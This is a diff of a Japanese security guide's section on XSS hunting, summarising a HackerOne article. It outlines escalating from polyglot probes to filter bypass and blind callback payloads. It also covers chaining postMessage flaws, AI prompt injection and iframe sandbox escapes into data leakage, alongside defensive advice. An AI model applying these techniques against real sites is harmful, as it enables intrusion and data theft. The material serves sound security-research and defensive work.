-4. **コンテキストに応じたペイロードで確定させる**: 反応が見えたら、そのコンテキストに特化したペイロードで実際にJS実行まで持っていく。
-5. **フィルタがある場合は挙動を観察してバイパスを組み立てる**: エラーメッセージや反映結果の変化から、どの文字・タグが除去/エスケープされているかを推測し、パーサ再解釈などの原理を使って回避する。
-6. **画面に出ない実行面はブラインドXSSで潰す**: 管理画面やバックオフィス系機能など、直接見えない反映先にはコールバック型のペイロードを仕込んで待つ。
-7. **見つけた脆弱性を単体で終わらせず、連鎖できないか検討する**: 6.4.2節で見たように、origin検証漏れやサンドボックスの弱点と組み合わせることで、影響範囲を大きく拡大できないか常に問い直す。
+記事は最新の Hacker-Powered Security Report を引用し、2025年単年で **13,000件以上の有効なXSSレポート**が確認されたとし、XSSが現代のWebアプリケーションにおいて依然として高頻度に発見される脆弱性クラスであると位置づけている。締めくくりとして記事は次のように述べている。
 
-> 出典: How to Find XSS Vulnerabilities: Practical Security Guide — https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments
+> "nothing beats the curiosity, creativity, and persistence of a security researcher" — 「セキュリティ研究者の好奇心・創造性・粘り強さに勝るものはない」
+
+つまり、構造化されたテスト手順（ポリグロット→コンテキスト特定→フィルタバイパス/ブラインドXSSでの深掘り）と、既存のツール・ペイロード集の活用を土台としつつも、最終的に高難度の脆弱性を見つけるのは、アプリケーション固有の実装の癖に対する探究心と試行錯誤であるという実務的な結論である。
+
+> 出典: How to Find XSS: Techniques Security Researchers Use in Real Environments（Haoxi Tan, HackerOne Blog, 2026年4月1日） — https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments
 
 ### 6.4.4 本節の要点
 
-- 個々には中程度の重大度に見える弱点（postMessageのorigin検証漏れ、プロンプトインジェクション、サンドボックスの隙間）でも、**出力を次の入力につなぐ連鎖**を組み立てることで、フルチェーンのXSS・データ漏洩に到達しうる。
-- `sandbox` 属性やAIの実行環境は「安全な箱」ではなく、あくまで権限を絞るための仕組みに過ぎない。`window.name` の永続性やフレーム階層トラバーサルなど、境界をまたぐ既知の抜け道と組み合わされると容易に破られる。
-- AI生成コンテンツは、通常のユーザー入力と同様（あるいはそれ以上に）信頼できない外部データとして扱い、DOM sinkへ渡す前に必ずサニタイズする。
-- 実務での発見は「ポリグロットで広く当たりをつける→コンテキスト特化ペイロードで確定→フィルタバイパスやブラインドXSSで深掘りする」という段階的なプロセスであり、パーサの再解釈という共通原理を理解していれば、個別のペイロード暗記に頼らず応用が利く。
+- 個々には中程度の重大度に見える弱点（postMessageのorigin検証漏れ、AIプロンプトインジェクション、`window.name`永続化やフレーム階層トラバーサルによるサンドボックス脱出）でも、**出力を次の入力につなぐ連鎖**を組み立てることで、フルチェーンのXSS・持続的なデータ漏洩に到達しうる。
+- `sandbox` 属性は「安全な箱」ではなく、あくまでCookie・ストレージ・トップレベルナビゲーションなど一部の権限を絞るための仕組みに過ぎない。スクリプト実行自体や `postMessage` 通信、`window.opener` 経由の参照は制限されないため、これらを踏み台にした脱出が成立する。
+- AI生成コンテンツは、通常のユーザー入力と同様（あるいはそれ以上に）信頼できない外部データとして扱い、DOM sinkへ渡す前に必ずサニタイズし、`postMessage` は送受信双方でオリジンを厳密に検証する。
+- 実務での発見は「ポリグロットで広く当たりをつける→自動ツール(Dalfox/XSStrike)と手動テストを使い分ける→コンテキスト特化ペイロードで確定→DOM Invaderでsource/sinkを可視化する→ブラインドXSSやPDF・Electronのような異例の実行面まで潰す」という段階的なプロセスであり、パーサの再解釈・権限昇格という共通原理を理解していれば、個別のペイロード暗記に頼らず応用が利く。
+- 見つけた脆弱性を単体の報告で終わらせず、「他の既知の弱点と組み合わせて影響範囲を拡大できないか」を常に問い直す姿勢が、複合連鎖の発見と高い報奨評価につながる。
